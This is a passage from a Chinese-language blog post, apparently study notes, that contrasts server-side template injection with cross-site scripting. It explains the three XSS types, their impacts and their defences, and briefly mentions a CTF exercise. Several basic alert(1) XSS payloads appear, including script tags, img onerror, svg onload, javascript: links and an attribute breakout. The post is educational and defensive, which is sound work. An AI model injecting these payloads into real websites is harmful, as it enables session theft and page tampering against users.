+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>欢迎，<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-number">1</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>浏览器会把它当 JavaScript 执行。</p>
+<p>这就是 XSS。</p>
+<hr>
+<h2 id="2-XSS-的三种类型"><a href="#2-XSS-的三种类型" class="headerlink" title="2. XSS 的三种类型"></a>2. XSS 的三种类型</h2><h3 id="（1）反射型-XSS"><a href="#（1）反射型-XSS" class="headerlink" title="（1）反射型 XSS"></a>（1）反射型 XSS</h3><p>恶意 payload 来自当前请求，服务端立刻把它反射到响应里。</p>
+<p>例如搜索页：</p>
+<p>代码块</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">/search?q=<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-number">1</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>服务端返回：</p>
+<p>html</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>你搜索的是：<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-number">1</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>浏览器执行。</p>
+<p>特点：</p>
+<ul>
+<li>不会存储；</li>
+<li>需要诱导受害者点击恶意链接；</li>
+<li>常见于搜索、错误页、跳转参数。</li>
+</ul>
+<hr>
+<h3 id="（2）存储型-XSS"><a href="#（2）存储型-XSS" class="headerlink" title="（2）存储型 XSS"></a>（2）存储型 XSS</h3><p>payload 被存进数据库，其他用户访问页面时触发。</p>
+<p>例如评论：</p>
+<p>html</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;img <span class="hljs-attribute">src</span>=x <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;alert(1)&quot;</span>&gt;<br></code></pre></td></tr></table></figure>
+
+<p>评论被保存，管理员打开后台审核时执行。</p>
+<p>特点：</p>
+<ul>
+<li>危害最大；</li>
+<li>不需要受害者点击特定链接；</li>
+<li>常见于评论、留言、用户名、工单、日志、后台管理页。</li>
+</ul>
+<p>CTF 里的“admin bot 访问你的评论”通常就是存储型 XSS。</p>
+<hr>
+<h3 id="（3）DOM-型-XSS"><a href="#（3）DOM-型-XSS" class="headerlink" title="（3）DOM 型 XSS"></a>（3）DOM 型 XSS</h3><p>服务端可能完全没参与，问题出在前端 JavaScript。</p>
+<p>例如：</p>
+<p>javascript</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">document.getElementById<span class="hljs-punctuation">(</span><span class="hljs-string">&quot;out&quot;</span><span class="hljs-punctuation">)</span>.innerHTML = location.hash.slice<span class="hljs-punctuation">(</span><span class="hljs-number">1</span><span class="hljs-punctuation">)</span><span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
+
+<p>访问：</p>
+<p>代码块</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">/page#&lt;img <span class="hljs-attribute">src</span>=x <span class="hljs-attribute">onerror</span>=alert(1)&gt;<br></code></pre></td></tr></table></figure>
+
+<p><code>innerHTML</code> 把 hash 内容当 HTML 解析，触发 <code>onerror</code>。</p>
+<p>特点：</p>
+<ul>
+<li>数据流在浏览器里完成；</li>
+<li>服务端日志可能看不到 payload；</li>
+<li>常见危险点：<ul>
+<li><code>innerHTML</code></li>
+<li><code>document.write</code></li>
+<li><code>eval</code></li>
+<li><code>setTimeout(string)</code></li>
+<li><code>location</code></li>
+<li><code>element.setAttribute(&quot;href&quot;, ...)</code></li>
+</ul>
+</li>
+</ul>
+<p>安全写法：</p>
+<p>javascript</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">document.getElementById<span class="hljs-punctuation">(</span><span class="hljs-string">&quot;out&quot;</span><span class="hljs-punctuation">)</span>.textContent = location.hash.slice<span class="hljs-punctuation">(</span><span class="hljs-number">1</span><span class="hljs-punctuation">)</span><span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
+
+<p><code>textContent</code> 只当文本，不解析 HTML。</p>
+<hr>
+<h2 id="3-XSS-的常见-payload"><a href="#3-XSS-的常见-payload" class="headerlink" title="3. XSS 的常见 payload"></a>3. XSS 的常见 payload</h2><p>最基础：</p>
+<p>html</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-number">1</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>事件处理器：</p>
+<p>html</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;img <span class="hljs-attribute">src</span>=x <span class="hljs-attribute">onerror</span>=alert(1)&gt;<br></code></pre></td></tr></table></figure>
+
+<p>SVG：</p>
+<p>html</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">alert(1)</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>链接：</p>
+<p>html</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;javascript:alert(1)&quot;</span>&gt;</span>点我<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>属性闭合：</p>
+<p>html</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">x</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(1)</span>&quot;&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>注意：</p>
+<ul>
+<li>XSS 不一定需要 <code>&lt;script&gt;</code>；</li>
+<li>现代浏览器对 <code>innerHTML</code> 插入的 <code>&lt;script&gt;</code> 可能不执行，但事件处理器如 <code>onerror</code> 仍可能执行；</li>
+<li>具体能不能触发，取决于输出上下文和浏览器解析。</li>
+</ul>
+<hr>
+<h2 id="4-XSS-的危害"><a href="#4-XSS-的危害" class="headerlink" title="4. XSS 的危害"></a>4. XSS 的危害</h2><ul>
+<li>窃取 Cookie（如果没设 <code>HttpOnly</code>）；</li>
+<li>以受害者身份发请求，执行 CSRF；</li>
+<li>读取页面上的敏感信息；</li>
+<li>修改页面内容、钓鱼；</li>
+<li>记录键盘输入；</li>
+<li>在后台管理员页面执行操作；</li>
+<li>worm 式传播。</li>
+</ul>
+<p>即使 Cookie 设置了 <code>HttpOnly</code>，XSS 仍然可以：</p>
+<ul>
+<li>以用户身份发请求；</li>
+<li>读取页面 DOM；</li>
+<li>偷 CSRF token；</li>
+<li>修改页面；</li>
+<li>发起钓鱼。</li>
+</ul>
+<p>所以 <code>HttpOnly</code> 只能缓解“偷 Cookie”，不能根治 XSS。</p>
+<hr>
+<h2 id="5-XSS-的防御"><a href="#5-XSS-的防御" class="headerlink" title="5. XSS 的防御"></a>5. XSS 的防御</h2><p>核心原则：</p>
+<blockquote>
+<p><strong>根据输出上下文做编码，不要相信任何用户输入。</strong></p>
+</blockquote>
+<h3 id="（1）HTML-文本上下文"><a href="#（1）HTML-文本上下文" class="headerlink" title="（1）HTML 文本上下文"></a>（1）HTML 文本上下文</h3><p>把 <code>&lt;</code>、<code>&gt;</code>、<code>&amp;</code>、<code>&quot;</code>、<code>&#39;</code> 转义：</p>
+<p>代码块</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">&lt;<span class="hljs-keyword">script</span>&gt; → &amp;lt;<span class="hljs-keyword">script</span>&amp;gt;<br></code></pre></td></tr></table></figure>
+
+<h3 id="（2）HTML-属性上下文"><a href="#（2）HTML-属性上下文" class="headerlink" title="（2）HTML 属性上下文"></a>（2）HTML 属性上下文</h3><p>属性值要加引号，并转义：</p>
+<p>html</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;input <span class="hljs-attribute">value</span>=<span class="hljs-string">&quot;用户输入&quot;</span>&gt;<br></code></pre></td></tr></table></figure>
+
+<h3 id="（3）JavaScript-上下文"><a href="#（3）JavaScript-上下文" class="headerlink" title="（3）JavaScript 上下文"></a>（3）JavaScript 上下文</h3><p>不要直接拼：</p>
+<p>javascript</p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">var name <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&lt;?= user_input ?&gt;&quot;</span><span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
+
+<p>应该用 JSON 序列化：</p>
+<p>javascript</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">var name</span> = &lt;<span class="hljs-meta">?= json_encode(user_input) ?</span>&gt;;<br></code></pre></td></tr></table></figure>
+
+<h3 id="（4）URL-上下文"><a href="#（4）URL-上下文" class="headerlink" title="（4）URL 上下文"></a>（4）URL 上下文</h3><p>使用 <code>encodeURIComponent</code>，并校验协议，禁止 <code>javascript:</code>。</p>
+<h3 id="（5）使用安全-API"><a href="#（5）使用安全-API" class="headerlink" title="（5）使用安全 API"></a>（5）使用安全 API</h3><p>不要用：</p>
+<p>javascript</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">element.innerHTML</span> = userInput<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
+
+<p>用：</p>
+<p>javascript</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">element.textContent</span> = userInput<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
+
+<p>React 的 <code>dangerouslySetInnerHTML</code>、Vue 的 <code>v-html</code> 都是危险入口，除非内容已经过严格清洗。</p>
+<h3 id="（6）富文本清洗"><a href="#（6）富文本清洗" class="headerlink" title="（6）富文本清洗"></a>（6）富文本清洗</h3><p>如果业务必须允许 HTML，使用 DOMPurify 等白名单清洗库，不要自己写正则。</p>
+<h3 id="（7）CSP"><a href="#（7）CSP" class="headerlink" title="（7）CSP"></a>（7）CSP</h3><p>http</p>
+<figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-title class_">Content</span>-<span class="hljs-title class_">Security</span>-<span class="hljs-title class_">Policy</span>: <span class="hljs-keyword">default</span>-src <span class="hljs-string">&#x27;self&#x27;</span>; script-src <span class="hljs-string">&#x27;self&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p>CSP 可以降低 XSS 影响，但不能替代输出编码。</p>
+<h3 id="（8）Cookie-安全属性"><a href="#（8）Cookie-安全属性" class="headerlink" title="（8）Cookie 安全属性"></a>（8）Cookie 安全属性</h3><p>http</p>
+<figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-title class_">Set</span>-<span class="hljs-title class_">Cookie</span>: session=...; <span class="hljs-title class_">HttpOnly</span>; <span class="hljs-title class_">Secure</span>; <span class="hljs-title class_">SameSite</span>=<span class="hljs-title class_">Lax</span><br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="四、SSTI-和-XSS-的关系"><a href="#四、SSTI-和-XSS-的关系" class="headerlink" title="四、SSTI 和 XSS 的关系"></a>四、SSTI 和 XSS 的关系</h2><h3 id="它们不是一回事"><a href="#它们不是一回事" class="headerlink" title="它们不是一回事"></a>它们不是一回事</h3><ul>
+<li>SSTI：服务器执行模板代码；</li>
+<li>XSS：浏览器执行 JavaScript。</li>
+</ul>
+<p>SSTI 可以读服务器文件、执行系统命令；<br>XSS 不能直接读服务器文件，但能操作受害者浏览器。</p>
+<p>#2. SSTI 可以导致 XSS</p>
+<p>如果模板注入的输出是 HTML，攻击者可以插入：</p>
+<p>代码块</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&#123;&#123;&#x27;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-number">1</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>&#x27;&#125;&#125;<br></code></pre></td></tr></table></figure>
+
+<p>服务端渲染后，浏览器可能执行。</p>
+<p>但这不是 XSS 作为根因，而是 SSTI 产生的 HTML 又触发了 XSS。</p>
+<p>#3. XSS 不能直接变成 SSTI</p>
+<p>XSS 在浏览器里执行，无法直接让服务器模板引擎执行代码。<br>除非它进一步利用其他服务端漏洞。</p>
+<h3 id="记忆方法"><a href="#记忆方法" class="headerlink" title="记忆方法"></a>记忆方法</h3><p>先立一个共同前提：所有注入漏洞都是同一个故事<br>想象一家连锁餐厅的「菜品公告系统」：</p>
+<ul>
+<li>菜谱模板：今日推荐：，售价-</li>
+<li>厨师：模板引擎（Jinja2、Freemarker 这些）</li>
+<li>填空的内容：用户提交的数据</li>
+</ul>
+<p><strong>XSS：纸条贴在了顾客餐桌上</strong><br>你在餐厅留言板（评论区）写了一行字，本来是给其他顾客看的。但餐厅没做任何处理，把这句话原样印在了下一位顾客的餐桌上。<br>关键是：那位顾客有毛病——他看到纸上写着”把你的钱包交给门口穿灰衣服的人”，就会真的照做。<br>这就是浏览器。它对页面里出现的脚本不加辨别，一律执行。<br>你的纸条在别人的餐桌上生效 → 代码在用户的浏览器里跑<br>受害者是其他顾客 → 其他用户，丢的是他的钱包和门禁卡（Cookie、会话、身份）<br>餐厅本身毫发无损，厨房照旧营业，服务器没被攻破<br>还有种情况是”纸条上写着’请每位看到它的顾客都去门口接一个灰衣服的人进来’”——这就是 XSS 蠕虫，一个 payload 靠一屋子顾客自己传播<br><strong>SSTI：纸条被贴进了后厨的菜谱上</strong><br>同样是那行字，但这次它没落到餐桌上，而是直接贴到了厨师手上的菜谱里。<br>厨师有个致命习惯：他分不清”要念出来的菜名”和”要执行的指令”。你贴什么他就照做什么。<br>你写 49，他愣了下，回你一句”四十九”——这不是文字是指令，他真的在脑子里算了。<br>接下来你可以写的就不止是算术了：<br>“把保险柜密码念给我听” → ，读配置、读密钥<br>“去仓库把账本全搬出来” → 读数据库、读源码<br>“把后门钥匙寄到这个地址” → 反弹 Shell，拿到服务器<br>你从”给顾客递纸条的小流氓”，变成了”能指挥整个后厨的厨师长”。 这就是 RCE。</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>XSS</th>
+<th>SSTI</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>纸条贴在哪</td>
+<td>顾客的餐桌上</td>
+<td>厨师手上的菜谱里</td>
+</tr>
+<tr>
+<td>谁被执行了</td>
+<td>隔壁桌的顾客</td>
+<td>厨师本人</td>
+</tr>
+<tr>
+<td>后果</td>
+<td>顾客丢钱包、被带进坏人</td>
+<td>你直接接管后厨</td>
+</tr>
+<tr>
+<td>破坏半径</td>
+<td>一个用户</td>
+<td>全站数据、内网、服务器</td>
+</tr>
+</tbody></table>
+<p>一句话：XSS 是隔着玻璃偷别人的东西，SSTI 是走进了别人的房子。<br>防 XSS（管住顾客的执行习惯）</p>
+<ul>
+<li>输出编码：纸条印上桌之前，把所有”咒语”字符都打上引号，让它看起来只能是被读的文字，不可能变成指令。注意得按语境</li>
+<li>分开处理——餐桌上的规则、菜单上的规则、名片上的规则各不相同</li>
+<li>CSP：给顾客发条规定”只执行餐厅官方印刷品，手写纸条一律无视”。</li>
+<li>HttpOnly Cookie：把钱包做成”顾客自己也打不开”的那种，JS 偷到手也没用.</li>
+</ul>
+<p>防 SSTI（别让纸条进后厨）<br>唯一根治办法：纸条永远只能贴在”顾客区”，物理上不允许它接触菜谱。代码层面就是把用户输入作为变量传给模板，而不是拼进模板字符串里。<br>沙箱（SandboxedEnvironment）：有些业务（自定义邮件模板）确实必须让客户写模板，那就建一个独立隔离的样板间厨房——真着火了也烧不到主楼。<br>重要提醒：autoescape 那套”消毒”防的是 XSS，对 SSTI 一点用都没有。转义管的是”怎么印上桌”，管不了”纸条被贴进菜谱”。</p>
+<p>代码块</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">SSTI：输入 → 服务端模板引擎 → 执行 → 返回 <span class="hljs-selector-tag">HTML</span><br>XSS：输入 → 服务端/前端写入 <span class="hljs-selector-tag">HTML</span> → 浏览器 JS 引擎 → 执行<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="五、JNCTF训练赛"><a href="#五、JNCTF训练赛" class="headerlink" title="五、JNCTF训练赛"></a>五、JNCTF训练赛</h2><p>#模拟宇宙 1</p>
+<ul>
+<li>404 页面把 <code>request.path</code> 拼进 <code>render_template_string</code>；</li>
+<li><code>&#123;&#123;7*7&#125;&#125;</code> 返回 <code>49</code>；</li>
+<li>这是 <strong>SSTI</strong>；</li>
+<li>利用 Jinja2 对象链执行命令。</li>
+</ul>
+<hr>
+<h2 id="六、最后总结"><a href="#六、最后总结" class="headerlink" title="六、最后总结"></a>六、最后总结</h2><table>
+<thead>
+<tr>
+<th>问题</th>
+<th>答案</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>SSTI 是什么</td>
+<td>用户输入被当成服务端模板代码执行</td>
+</tr>
+<tr>
+<td>XSS 是什么</td>
+<td>用户输入被当成浏览器 HTML&#x2F;JS 执行</td>
+</tr>
+<tr>
+<td>SSTI 在哪执行</td>
+<td>服务器</td>
+</tr>
+<tr>
+<td>XSS 在哪执行</td>
+<td>浏览器</td>
+</tr>
+<tr>
+<td>SSTI 能干什么</td>
+<td>读文件、读配置、RCE</td>
+</tr>
+<tr>
+<td>XSS 能干什么</td>
+<td>盗会话、CSRF、钓鱼、篡改页面</td>
+</tr>
+<tr>
+<td>SSTI 怎么防</td>
+<td>不把输入拼进模板，使用变量和沙箱</td>
+</tr>
+<tr>
+<td>XSS 怎么防</td>
+<td>上下文输出编码、安全 API、CSP、HttpOnly</td>
+</tr>
+<tr>
+<td>共同点</td>
+<td>都是注入，都是“把数据当代码”</td>
+</tr>
+<tr>
+<td>最大区别</td>
+<td>一个在服务端，一个在客户端</td>
+</tr>
+</tbody></table>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E5%AD%A6%E4%B9%A0/" class="category-chain-item">学习</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Web/" class="print-no-link">#Web</a>
+      
+        <a href="/tags/SSTI/" class="print-no-link">#SSTI</a>
+      
+        <a href="/tags/XSS/" class="print-no-link">#XSS</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>SSTI 与 XSS 的区别</div>
+      <div>https://changee25.github.io/2026/11/02/about-ssti-xss/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>AMOUR</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年11月2日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/10/31/php-basics/" title="PHP 入门笔记">
+                        <span class="hidden-mobile">PHP 入门笔记</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      var light = 'github-light';
+      var dark = 'github-dark';
+      var schema = document.documentElement.getAttribute('data-user-color-scheme');
+      if (schema === 'dark') {
+        schema = dark;
+      } else {
+        schema = light;
+      }
+      window.UtterancesThemeLight = light;
+      window.UtterancesThemeDark = dark;
+      var s = document.createElement('script');
+      s.setAttribute('src', 'https://utteranc.es/client.js');
+      s.setAttribute('repo', 'Changee25/changee25.github.io');
+      s.setAttribute('issue-term', 'pathname');
+      
+      s.setAttribute('theme', schema);
+      s.setAttribute('crossorigin', 'anonymous');
+      document.getElementById('comments').appendChild(s);
+    })
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <span>© 2026 AMOUR</span> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="/vendor/lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="/vendor/lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="/vendor/lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="/vendor/lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('/vendor/lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    function isExpandAllEnabled() {
+      return CONFIG.toc && CONFIG.toc.expand_all === true;
+    }
+    function expandAllToc() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .tocbot-is-collapsed').removeClass('tocbot-is-collapsed');
+    }
+    function updateTocToggle($li, $childList) {
+      var $toggle = $li.children('.toc-toggle');
+      if ($toggle.length === 0) { return; }
+      var collapsed = $childList.hasClass('tocbot-is-collapsed');
+      $toggle
+        .toggleClass('toc-toggle-collapsed', collapsed)
+        .toggleClass('toc-toggle-expanded', !collapsed);
+    }
+    function bindTocToggle() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .toc-list-item').each(function() {
+        var $li = jQuery(this);
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) {
+          if ($li.children('.toc-toggle').length === 0) {
+            $li.prepend('<span class="toc-toggle toc-toggle-placeholder" aria-hidden="true">›</span>');
+          }
+          return;
+        }
+
+        if ($li.children('.toc-toggle').length === 0) {
+          $li.prepend('<span class="toc-toggle toc-toggle-expanded" aria-hidden="true">›</span>');
+        }
+        updateTocToggle($li, $childList);
+      });
+      jQuery('#toc-body').off('click.tocToggle').on('click.tocToggle', '.toc-toggle', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        var $li = jQuery(this).parent('.toc-list-item');
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) { return; }
+        $childList.toggleClass('tocbot-is-collapsed');
+        updateTocToggle($li, $childList);
+      });
+      if (!window.__tocToggleObserver) {
+        window.__tocToggleObserver = new MutationObserver(function(mutations) {
+          mutations.forEach(function(mutation) {
+            if (mutation.type !== 'attributes' || mutation.attributeName !== 'class') { return; }
+            var $list = jQuery(mutation.target);
+            var $li = $list.parent('.toc-list-item');
+            if ($li.length === 0) { return; }
+            updateTocToggle($li, $list);
+          });
+        });
+        jQuery('#toc-body ol').each(function() {
+          window.__tocToggleObserver.observe(this, { attributes: true });
+        });
+      }
+    }
+    var tocConfig = Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc);
+    if (isExpandAllEnabled()) {
+      tocConfig.collapseDepth = 6;
+    }
+    window.tocbot.init(tocConfig);
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+    expandAllToc();
+    bindTocToggle();
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+        expandAllToc();
+        bindTocToggle();
+      }
+    });
+  });
+</script>
+
+
+  <script src=/vendor/lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('/vendor/lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('/vendor/lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+
+
+
+
